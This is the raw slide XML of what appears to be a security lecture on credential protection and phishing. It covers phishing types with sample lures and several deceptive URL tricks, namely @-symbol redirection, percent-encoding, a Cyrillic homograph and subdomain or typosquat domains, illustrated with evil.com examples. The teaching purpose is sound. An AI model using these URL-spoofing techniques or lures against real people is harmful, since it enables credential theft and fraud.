          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01FEB52D-A151-EC53-6990-87603048463F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Store credentials securely (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>hashed + salted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Regularly monitor for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>credential leaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> so stolen passwords alone don’t work.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Deploy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>anti-malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> and endpoint protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Encourage users to avoid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reusing passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>breach detection systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to flag leaked credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>zero-trust authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> models.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="196060984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4D7E5-A0F7-7B1D-DDA2-1FF2B0E0E1F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Phishing Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D59777A4-77B7-D5A4-AC84-93CED1F594BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A phishing attack is a type of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>cyberattack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> where malicious actors </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>impersonate legitimate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>entities in deceptive communications, such as emails, texts, or phone calls, to trick victims into divulging sensitive information like passwords, credit card numbers, or bank details.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Social engineering attack to trick users into revealing credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Delivered via emails, SMS, fake websites, phone calls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Exploits human trust by imitating legitimate entities (banks, employers).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>May install malware if user downloads attachments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Easy to execute, high success rate if users are unaware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Remains one of the top causes of data breaches.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="349333901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76D1F-BA45-CF3B-731F-69DCE496526C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Types of Phishing Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B5087CA-3094-A0D0-F7E2-CA08404E242E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Email Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750" algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The most common form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750" algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers send mass emails pretending to be trusted organizations (banks, social media, government).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Spear Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Targeted phishing aimed at a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>specific person or organization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Customized using personal details (job title, colleagues, recent events).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> An attacker emails a company’s HR head pretending to be the CEO requesting salary reports.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Whaling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A type of spear phishing targeting </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>high-profile individuals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (executives, government officials).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Usually disguised as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>legal notices, business emails, or urgent company matters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="254696025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CD1F-3A93-CB5B-B0AC-130E3D47BA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9EE72B-833F-713E-09E7-B178285173DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Types of Phishing Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{665C38AB-7951-9BFA-E5F2-DC6B73EF3EA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Smishing (SMS Phishing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Phishing via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>text messages (SMS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Contains malicious links or prompts to call a fake number.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> SMS: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0"/>
              <a:t>“Your bank account is locked. Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://bank-verify.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Vishing (Voice Phishing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Conducted over the phone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attackers impersonate banks, tech support, or government agencies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Caller says: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0"/>
              <a:t>“We’re from Microsoft Support. We detected a virus on your computer. Please give us remote access.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Clone Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attacker copies a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>legitimate email</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (like a bank alert) but replaces the links/attachments with malicious ones.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> A copied PayPal email with a fake login link.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="381255984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25FAA-77D2-2FF5-6FE7-A11880F5E6F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples of Phishing URL Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAF337C6-7209-BA20-F64B-E8EFA88DD308}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="609600"/>
            <a:ext cx="7704000" cy="4272116"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>1. Using @ Symbol: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Anything before @ is ignored by the browser, the real site is after it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>http://www.google.com@evil.com/login</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="596900" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Looks like “google.com” but actually takes you to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>2. Using Encoded Characters: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attackers encode parts of the URL so it looks legitimate but hides the real destination.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>http://%77%77%77%2Ebank.com.evil.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="596900" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>https://facebook.com@%61%62%63.%43%4F%4D – opens abc.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="596900" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>https://facebook.com.%61%62%63.%43%4F%4D - ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>3. Using Similar-Looking Latin/Unicode Characters (Homograph Attack) : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Replacing characters with visually similar ones (“а” vs Latin “a”).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> http://www.аррӏе.com (The letters р, ӏ, and е are Cyrillic) → looks like “apple.com” but is malicious.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="283705534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901F9-A10D-72C0-1AA8-6C592F4A90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48BE68-FF32-C0B2-FB77-7F397704877B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples of Phishing URL Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F4E9C6E-57EE-E233-2BE5-8A0814AF1E1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>4. Using Subdomains to Confuse Users: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers put the trusted name in a subdomain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Example</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>:http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>://paypal.com.evil.com/login</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>5. Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (Misspelled Domains): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers register domains with small spelling changes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Examples: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://gooogle.com  (extra “o”)  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F69F57F9-F6D5-A8B6-2463-645DCAEDA54A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1423391" y="2615628"/>
            <a:ext cx="5936054" cy="2497236"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="395567655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60AAF-86BE-6215-912A-C6DE62647334}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
